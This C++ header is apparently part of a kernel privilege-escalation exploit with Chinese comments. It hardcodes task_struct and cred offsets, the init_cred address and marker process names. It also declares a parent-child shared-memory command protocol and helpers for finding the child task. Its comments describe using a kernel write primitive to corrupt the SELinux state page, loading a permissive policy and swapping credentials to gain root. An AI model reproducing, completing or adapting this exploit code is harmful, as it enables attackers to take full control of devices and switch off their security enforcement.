#pragma once
#include <atomic>
#include "../const.h"
constexpr unsigned long OFF_TASKS      = 0x6d8;  // struct list_head tasks
constexpr unsigned long OFF_SIBLING    = 0x808;  // child->sibling − 本值 = child task
constexpr unsigned long OFF_REAL_CRED  = 0x980;  // const struct cred *real_cred
constexpr unsigned long OFF_CRED       = 0x988;  // const struct cred *cred
constexpr unsigned long OFF_COMM       = 0x990;  // char comm[16]
constexpr unsigned long LINK_INIT_CRED = 0xffffff800b42e9c0UL; // nm vmlinux: D init_cred
constexpr char PARENT_COMM[16] = "glroot!!";
constexpr char CHILD_COMM[16]  = "glchild!";
constexpr unsigned long PARENT_COMM_HEAD = 0x2121746f6f726c67; // "glroot!!" 前 8 字节（小端）
constexpr unsigned long CHILD_COMM_HEAD = 0x21646c6968636c67; // glchild!小端16进制
constexpr int MAX_HOPS = 5; // 槽预算：1 + 2*5 + 1 + 2 = 14 发

constexpr const char *PATH_LOAD   = "/sys/fs/selinux/load";
constexpr const char *PATH_POLICY = "/sys/fs/selinux/policy";
constexpr unsigned long PROBE_LEN = 64UL * 1024 * 1024 + 1;
constexpr int  V_SPIN_US  = 200;  // 子进程轮询间隔

//ShareMem::cmd
enum {
    CMD_NULL = 0, CMD_GETUID = 1, CMD_OPEN_LOAD = 2, CMD_GENERATE_AVC = 3,
    CMD_WRITE_LOAD = 4, CMD_CLOSE = 5
};

struct ShareMem {
    std::atomic<int> cmd = 0; // 父要求子做的函数调用
    std::atomic<int> rc = 0; // 子进程调用某个函数返回码
    std::atomic<int> err = 0; // 子进程 errno
    std::atomic<int> seq = 0; // 父：已下发的序号
    std::atomic<int> ack = 0; // 子：已完成的序号
};

// SELinux 状态页（PAD=1：0xffffff800c3b5000 = __bss_stop-0x1000）
// 布局：+0 disabled / +1 enforcing / +2 initialized(bool) / +3 policycap[6] / +9 ...
// initialized 占一个字节，写原语是 8 字节指针值，让低字节落在 initialized。
inline unsigned long LINK_SELINUX_STATE = LINK_BSS_STOP - 0x1000;
void load_policy_then_root();
inline std::string g_blob; //从本地加载编译好的permissive策略

//杂七杂八工具（misc.cpp）
void blob2memory(Print &print);
void child_wait_cmd(ShareMem *sh);
void gate(Print &print);
unsigned long find_child_task(unsigned long task, Print &print);

//子进程原始cred，退出前恢复用
inline unsigned long child_cred_bak, child_real_cred_bak;